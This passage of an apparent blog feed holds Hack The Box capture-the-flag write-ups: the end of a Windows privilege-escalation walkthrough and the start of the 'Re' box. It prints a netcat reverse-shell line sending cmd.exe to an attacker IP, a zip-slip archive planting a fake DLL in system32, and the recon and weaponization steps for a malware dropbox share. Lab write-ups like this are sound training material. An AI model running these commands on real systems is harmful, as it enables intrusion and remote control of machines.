<li><a href="https://stackoverflow.com/questions/42258311/cannot-open-include-file-ctype-h-no-such-file-or-directory">Troubleshoot</a>
<ol>
<li>Tools &gt; Tools and Features</li>
<li>Check &lsquo;Universal Windows Platform Development Tools&rsquo;</li>
<li>update the project properties for both FakeDll.cpp and diaghub_exploit.cpp
<ol>
<li>Windows SDK version = 10.0.18362.0</li>
<li>Platform Toolset = Visual Studio 2019 (v142)</li>
</ol>
</li>
<li>Rebuild</li>
</ol>
</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">ls </span>z:/json/diaghub

    Directory: z:\json\diaghub

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---         2/19/2020  11:44 AM      91648 FakeDll.dll
-a---         2/19/2020  11:44 AM     141312 diaghub_exploit.exe

<span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">cp </span>z:/json/diaghub/* .
<span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">cp </span>z:/reverse.bat .
<span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">type </span>reverse.bat
.\nc64.exe -e cmd.exe 10.10.14.70 8000
<span style="color:#8be9fd;font-style:italic">PS </span>C:\tmp&gt; <span style="color:#8be9fd;font-style:italic">cp </span>z:/nc64.exe .
</code></pre></td></tr></table>
</div>
</div><p><code>C:\windows\system32\</code> is not writeable by userpool, so we attempt <code>zipslip</code> by creating an evil zip with the tool <a href="https://github.com/ptoomey3/evilarc">evilarc on github</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">git clone https:<span style="color:#ff79c6">//</span>github<span style="color:#ff79c6">.</span>com<span style="color:#ff79c6">/</span>ptoomey3<span style="color:#ff79c6">/</span>evilarc
cd evilarc
python2 evilarc<span style="color:#ff79c6">.</span>py <span style="color:#ff79c6">-</span>p <span style="color:#f1fa8c">&#34;\windows\system32&#34;</span> <span style="color:#ff79c6">-</span>o win <span style="color:#ff79c6">-</span>f zipslip<span style="color:#ff79c6">.</span>zip <span style="color:#ff79c6">../</span>www<span style="color:#ff79c6">/</span>json<span style="color:#ff79c6">/</span>diaghub<span style="color:#ff79c6">/</span>FakeDll<span style="color:#ff79c6">.</span>dll
Creating zipslip<span style="color:#ff79c6">.</span>zip containing <span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\<span style="color:#ff79c6">..</span>\\windows\system32\FakeDll<span style="color:#ff79c6">.</span>dll
</code></pre></td></tr></table>
</div>
</div><p>Uploading the evil zip file</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/www/json/diaghub$ ftp -p 10.10.10.158
Connected to 10.10.10.158.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse <span style="color:#ff79c6">(</span>tim.kosse@filezilla-project.org<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">220</span> Please visit https://filezilla-project.org/
Name <span style="color:#ff79c6">(</span>10.10.10.158:ctf<span style="color:#ff79c6">)</span>: qwerty
<span style="color:#bd93f9">331</span> Password required <span style="color:#ff79c6">for</span> qwerty
Password:
<span style="color:#bd93f9">230</span> Logged on
Remote system <span style="color:#8be9fd;font-style:italic">type</span> is UNIX.
ftp&gt; ls
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,252,48<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> directory listing of <span style="color:#f1fa8c">&#34;/&#34;</span>
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> <span style="color:#8be9fd;font-style:italic">$Recycle</span>.Bin
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> Boot
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp         <span style="color:#bd93f9">404250</span> Nov <span style="color:#bd93f9">21</span>  <span style="color:#bd93f9">2014</span> bootmgr
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">1</span> Jun <span style="color:#bd93f9">18</span>  <span style="color:#bd93f9">2013</span> BOOTNXT
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp           <span style="color:#bd93f9">8192</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> BOOTSECT.BAK
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2013</span> Documents and Settings
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> inetpub
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp     <span style="color:#bd93f9">1744830464</span> Feb <span style="color:#bd93f9">19</span> 09:23 pagefile.sys
-rw-r--r-- <span style="color:#bd93f9">1</span> ftp ftp             <span style="color:#bd93f9">22</span> May <span style="color:#bd93f9">23</span>  <span style="color:#bd93f9">2019</span> password.txt
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2013</span> PerfLogs
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">08</span>  <span style="color:#bd93f9">2019</span> Program Files
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">08</span>  <span style="color:#bd93f9">2019</span> Program Files <span style="color:#ff79c6">(</span>x86<span style="color:#ff79c6">)</span>
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> ProgramData
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> Recovery
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> sources
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> System Volume Information
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Feb <span style="color:#bd93f9">19</span> 16:44 tmp
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> May <span style="color:#bd93f9">22</span>  <span style="color:#bd93f9">2019</span> Users
drwxr-xr-x <span style="color:#bd93f9">1</span> ftp ftp              <span style="color:#bd93f9">0</span> Aug <span style="color:#bd93f9">08</span>  <span style="color:#bd93f9">2019</span> Windows
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/&#34;</span>
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> Windows
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Windows&#34;</span> is current directory.
ftp&gt; <span style="color:#8be9fd;font-style:italic">cd</span> system32
<span style="color:#bd93f9">250</span> CWD successful. <span style="color:#f1fa8c">&#34;/Windows/system32&#34;</span> is current directory.
ftp&gt; !ls
FakeDll.dll  diaghub_exploit.exe  zipslip.zip
ftp&gt; put FakeDll.dll
local: FakeDll.dll remote: FakeDll.dll
<span style="color:#bd93f9">227</span> Entering Passive Mode <span style="color:#ff79c6">(</span>10,10,10,158,205,252<span style="color:#ff79c6">)</span>
<span style="color:#bd93f9">150</span> Opening data channel <span style="color:#ff79c6">for</span> file upload to server of <span style="color:#f1fa8c">&#34;/Windows/system32/FakeDll.dll&#34;</span>
<span style="color:#bd93f9">226</span> Successfully transferred <span style="color:#f1fa8c">&#34;/Windows/system32/FakeDll.dll&#34;</span>
<span style="color:#bd93f9">91876</span> bytes sent in 0.01 secs <span style="color:#ff79c6">(</span>6.7744 MB/s<span style="color:#ff79c6">)</span>
ftp&gt;
ftp&gt; bye
</code></pre></td></tr></table>
</div>
</div><p>Unfortunately while we can see the FakeDll.dll from the Ftp server, we cannot see it from &lsquo;userpool&rsquo; shell :(</p>
]]></content></item><item><title>HTB - Re</title><link>https://0xade1.github.io/posts/2020/02/htb-re/</link><pubDate>Thu, 20 Feb 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/02/htb-re/</guid><description>RECONNAISSANCE Only two ports open: http 80 and smb 445
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # Nmap 7.60 scan initiated Mon Feb 10 13:23:35 2020 as: nmap -sC -sV -oA nmap/RE 10.10.10.144 Nmap scan report for re.htb (10.10.10.144) Host is up (0.16s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.</description><content type="html"><![CDATA[<h1 id="reconnaissance">RECONNAISSANCE</h1>
<p>Only two ports open: http 80 and smb 445</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#6272a4"># Nmap 7.60 scan initiated Mon Feb 10 13:23:35 2020 as: nmap -sC -sV -oA nmap/RE 10.10.10.144</span>
Nmap scan report <span style="color:#ff79c6">for</span> re.htb <span style="color:#ff79c6">(</span>10.10.10.144<span style="color:#ff79c6">)</span>
Host is up <span style="color:#ff79c6">(</span>0.16s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">998</span> filtered ports
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ghidra Dropbox Coming Soon!
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-02-10 14:23:49
|_  start_date: 1601-01-01 00:00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#6272a4"># Nmap done at Mon Feb 10 13:24:42 2020 -- 1 IP address (1 host up) scanned in 67.35 seconds</span>
</code></pre></td></tr></table>
</div>
</div><p>Exploring port the webserver, redirects us to <a href="http://reblog.htb">http://reblog.htb</a>, so we edit out /etc/hosts with a new line: <code>10.10.10.144 reblog.htb</code>.
We can now navigate the website and learn from many interesting blog posts about obfuscation and exploitation techniques.
It mentions that the SOC is hosting a dropbox for automated malware analysis. If somehow we manage to put some malware scripts;
it may execute if not detected by the SOC ;)</p>
<p>Let&rsquo;s have a look at the samba share on port 445</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">smbclient -L //10.10.10.144
WARNING: The <span style="color:#f1fa8c">&#34;syslog&#34;</span> option is deprecated
Enter WORKGROUP<span style="color:#f1fa8c">\c</span>tf&#39;s password:

         Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        malware_dropbox Disk

</code></pre></td></tr></table>
</div>
</div><p>Further exploration of the malware_dropbox folder shows we are able to write a file</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ctf@15bec4805337:~/htb$ smbclient //reblog.htb/malware_dropbox
WARNING: The <span style="color:#f1fa8c">&#34;syslog&#34;</span> option is deprecated
Enter WORKGROUP<span style="color:#f1fa8c">\c</span>tf&#39;s password:
Try <span style="color:#f1fa8c">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#f1fa8c">\&gt;</span> ls
  .                                   D        <span style="color:#bd93f9">0</span>  Tue Jun <span style="color:#bd93f9">18</span> 21:08:36 <span style="color:#bd93f9">2019</span>
  ..                                  D        <span style="color:#bd93f9">0</span>  Tue Jun <span style="color:#bd93f9">18</span> 21:08:36 <span style="color:#bd93f9">2019</span>

                <span style="color:#bd93f9">8247551</span> blocks of size 4096. <span style="color:#bd93f9">4293985</span> blocks available
smb: <span style="color:#f1fa8c">\&gt;</span> put test.txt test.txt
putting file test.txt as <span style="color:#f1fa8c">\t</span>est.txt <span style="color:#ff79c6">(</span>0.0 kb/s<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">(</span>average 0.0 kb/s<span style="color:#ff79c6">)</span>
smb: <span style="color:#f1fa8c">\&gt;</span> ls
  .                                   D        <span style="color:#bd93f9">0</span>  Thu Feb <span style="color:#bd93f9">13</span> 17:15:02 <span style="color:#bd93f9">2020</span>
  ..                                  D        <span style="color:#bd93f9">0</span>  Thu Feb <span style="color:#bd93f9">13</span> 17:15:02 <span style="color:#bd93f9">2020</span>
  test.txt                            A        <span style="color:#bd93f9">5</span>  Thu Feb <span style="color:#bd93f9">13</span> 17:15:02 <span style="color:#bd93f9">2020</span>

                <span style="color:#bd93f9">8247551</span> blocks of size 4096. <span style="color:#bd93f9">4293985</span> blocks available
smb: <span style="color:#f1fa8c">\&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Eploring the website, we observe the source code of <a href="http://reblog.htb">http://reblog.htb</a> which is a static website</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#6272a4">&lt;!-- Begin Jekyll SEO tag v2.5.0 --&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>However exploration of the http header shows us that the site is running ASP.NET: <code>X-Powered-By ASP.NET</code></p>
<h1 id="weaponization">WEAPONIZATION</h1>
<p>We use MSF msfconsole to weaponize a file that we will put on the malware_dropbox</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
